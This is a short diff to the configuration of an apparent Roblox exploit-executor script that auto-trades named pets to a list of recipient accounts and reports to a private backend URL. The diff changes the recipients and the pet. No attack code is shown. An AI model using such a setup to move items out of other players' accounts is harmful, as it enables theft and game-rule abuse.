@@ -2,10 +2,11 @@
 -- Конфигурация
 getgenv().Config = {
     Recipients = { -- Список получателей для трейда
-        "Mattegoda90168",
+        "Daanefida910",
+        "Semracaras53548"
     },
     PetsToTrade = { -- Список питомцев для трейда
-        "Mimic Octopus",
+        "Lobster Thermidor",
     },
     Enabled = true, -- Включить/выключить авто трейд
     BackendURL = "https://trade-private.vercel.app", -- URL бекенд сервера
